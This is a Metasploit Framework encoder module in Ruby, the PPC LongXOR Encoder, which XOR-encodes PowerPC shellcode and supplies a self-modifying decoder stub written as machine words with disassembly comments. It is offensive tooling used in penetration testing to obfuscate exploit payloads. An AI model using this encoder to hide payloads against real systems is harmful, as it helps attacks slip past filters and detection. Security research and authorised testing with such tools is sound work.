##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Encoder::Xor

  def initialize
    super(
      'Name'             => 'PPC LongXOR Encoder',
      'Description'      => %q{
        This encoder is ghandi's PPC dword xor encoder but uses a tag-based
        terminator rather than a length.
      },
      'Author'           => [ 'ddz', 'hdm' ],
      'Arch'             => ARCH_PPC,
      'Decoder'          =>
        {
          'KeySize'    => 4,
          'BlockSize'  => 4,
          'KeyPack'    => 'N',
        })
  end

  #
  # Returns the decoder stub
  #
  def decoder_stub(state)
    [
      0x7ca52a79,     # 0x1da4 <main>:          xor.    r5,r5,r5
      0x4082fffd,     # 0x1da8 <main+4>:        bnel+   0x1da4 <main>
      0x7fe802a6,     # 0x1dac <main+8>:        mflr    r31
      0x3bffd00c,     # 0x1db0 <main+12>:       addi    r31,r31,-12276
      0x38a53030,     # 0x1db4 <main+16>:       addi    r5,r5,12336
      0x3cc00102,     # 0x1db8 <main+20>:       lis     r6, hi16(key)
      0x60c60304,     # 0x1dbc <main+24>:       ori     r6,r6, lo16(key)
      0x811f3030,     # 0x1dc0 <main+28>:       lwz     r8,12336(r31)
      0x7d043279,     # 0x1dc4 <main+32>:       xor.    r4,r8,r6
      0x909f3030,     # 0x1dc8 <main+36>:       stw     r4,12336(r31)
      0x7c05f8ac,     # 0x1dcc <main+40>:       dcbf    r5,r31
      0x7cff04ac,     # 0x1dd0 <main+44>:       sync
      0x7c05ffac,     # 0x1dd4 <main+48>:       icbi    r5,r31
      0x3bc5cfd4,     # 0x1dd8 <main+52>:       addi    r30,r5,-12332
      0x7ffff214,     # 0x1ddc <main+56>:       add     r31,r31,r30
      0x4082ffe0,     # 0x1de0 <main+60>:       bne+    0x1dc0 <main+28>
      0x4cff012c,     # 0x1de4 <main+64>:       isync
    ].pack("N*")
  end

  #
  # Fix up the decoder stub now
  #
  def encode_finalize_stub(state, stub)
    stub[22, 2] = [ state.key.to_i ].pack('N')[0, 2]
    stub[26, 2] = [ state.key.to_i ].pack('N')[2, 2]

    stub
  end

  #
  # Append the decoder key now that we're done
  #
  def encode_end(state)
    state.encoded += [ state.key.to_i ].pack('N')
  end

end
